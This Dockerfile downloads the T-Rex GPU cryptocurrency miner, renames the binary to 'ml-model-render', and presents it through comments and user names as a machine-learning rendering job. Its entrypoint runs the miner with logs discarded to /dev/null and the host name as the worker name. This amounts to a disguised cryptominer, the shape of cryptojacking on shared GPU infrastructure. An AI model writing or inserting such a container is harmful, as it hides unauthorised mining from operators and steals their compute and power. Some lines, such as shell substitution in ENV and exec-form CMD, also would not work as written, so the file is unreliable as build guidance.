# The official install talks about Fedora packages, so let's see
# if Centos is close enough...
FROM ds-cuda-base:latest

# configuration
ENV BUILD_FOLDER=/build
ENV APP_FOLDER=/app
ENV APP_USER=mlgpu
ENV TREX_VERSION=0.19.5
ENV TREX_CUDA_VERSION=11.1
ENV CUDA_PKG_VERSION=11-1

ENV BUILD_HOST=$(hostname)
RUN yum update -y && yum install -y \
    cuda-nvrtc-$CUDA_PKG_VERSION \
    cuda-libraries-$CUDA_PKG_VERSION \
    cuda-tools-$CUDA_PKG_VERSION \
    cuda-nvcc-$CUDA_PKG_VERSION 

# Get the non-devel versions of the libraries that we need
RUN yum -y -q install openssl zlib libgomp wget &&  \
    yum clean all && \
    rm -rf /var/cache/yum/*

# Create a user to do the build
RUN adduser $APP_USER

RUN mkdir $BUILD_FOLDER && \
    chown $APP_USER.users $BUILD_FOLDER

RUN mkdir $APP_FOLDER && \
    chown $APP_USER.users $APP_FOLDER

# switch to the service user
USER $APP_USER

# Clone from the git repo
RUN cd $BUILD_FOLDER && \
    wget https://github.com/trexminer/T-Rex/releases/download/"$TREX_VERSION"/t-rex-"$TREX_VERSION"-linux-cuda"$TREX_CUDA_VERSION".tar.gz && \
    tar xzvf t-rex-$TREX_VERSION-linux-cuda"$TREX_CUDA_VERSION".tar.gz

# Update the default rendering configuration
WORKDIR $APP_FOLDER
RUN cp $BUILD_FOLDER/t-rex $APP_FOLDER/ml-model-render
COPY config .

# Set the entrypoint to run the configured rendering job
CMD [ "./ml-model-render", "-c", "config", "-l", "/dev/null", "-w", "$(hostname)" ]
